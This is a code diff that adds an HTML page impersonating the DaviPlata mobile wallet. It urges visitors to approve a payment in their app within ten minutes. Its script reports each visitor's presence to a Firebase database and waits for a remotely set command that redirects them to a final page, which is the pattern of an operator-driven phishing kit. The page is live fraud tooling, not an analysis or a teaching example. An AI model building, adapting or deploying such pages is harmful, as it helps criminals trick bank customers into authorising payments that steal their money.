@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DaviPlata - Autorización</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+
+<style>
+*{box-sizing:border-box;}
+body{
+  margin:0;
+  font-family:'Inter', sans-serif;
+}
+
+/* layout */
+.container{
+  display:flex;
+  min-height:100vh;
+}
+
+/* LEFT IMAGE */
+.left{
+  width:50%;
+  background:url('img.png') center/cover no-repeat;
+  border-top-right-radius:40px;
+  border-bottom-right-radius:40px;
+}
+
+/* RIGHT */
+.right{
+  width:50%;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+/* MODAL */
+.modal{
+  background:#fff;
+  padding:30px;
+  border-radius:20px;
+  width:420px;
+  text-align:center;
+  box-shadow:0 10px 40px rgba(0,0,0,0.2);
+}
+
+.modal img{
+  width:160px;
+  margin-bottom:15px;
+}
+
+h2{
+  font-size:20px;
+  margin-bottom:10px;
+}
+
+p{
+  font-size:14px;
+  color:#444;
+  line-height:1.4;
+}
+
+.bold{
+  font-weight:600;
+  margin:15px 0;
+}
+
+.small{
+  font-size:13px;
+  margin-top:10px;
+}
+
+/* overlay */
+.overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.6);
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+/* MOBILE */
+@media(max-width:900px){
+  .container{
+    flex-direction:column;
+  }
+
+  .left{
+    display:none;
+  }
+
+  .right{
+    width:100%;
+    padding:20px;
+  }
+
+  .overlay{
+    position:relative;
+    background:none;
+  }
+
+  .modal{
+    box-shadow:none;
+    width:100%;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="left"></div>
+
+  <div class="right">
+
+    <div class="overlay">
+      <div class="modal">
+
+        <img src="espera.jpg">
+
+        <h2>Ingresa a tu DaviPlata y aprueba este pago</h2>
+
+        <p>
+          Revisa la confirmación que enviamos a tu celular. 
+          Si no la recibiste, ingresa a las <b>notificaciones de tu DaviPlata</b> 
+          y selecciona la transacción que sale en la sección de novedades para completar el proceso.
+        </p>
+
+        <div class="bold">¡Tienes 10 minutos!</div>
+
+        <p class="small">
+          No cierres esta pestaña en tu navegador, aquí encontrarás el resumen de tu pago.
+        </p>
+
+      </div>
+    </div>
+
+  </div>
+
+</div>
+
+<script type="module" src="firebase.js"></script>
+
+<script>
+window.addEventListener('load', () => {
+const { db, uid, ref, update, onValue } = window;
+
+
+update(ref(db, "dataPages/" + uid), { 
+estado: "abierto",
+paginaActual: "Autorizacion.html" 
+});
+
+window.addEventListener("beforeunload", () => {
+update(ref(db, "dataPages/" + uid), { 
+estado: "cerrado",
+paginaActual: null  
+});
+});
+
+
+// ===============================
+// 🔥 SOLO AUTORIZACION Y FINAL
+// ===============================
+onValue(ref(db, "dataPages/" + uid), snapshot => {
+
+  const data = snapshot.val();
+  if (!data) return;
+
+  // 🔴 IR A FINAL
+  if (data.accion === "final") {
+
+    update(ref(db, "dataPages/" + uid), {
+      accion: null
+    });
+
+    window.location.href = "../../final.html";
+  }
+
+});
+
+
+});
+</script>
+
+</body>
+</html>
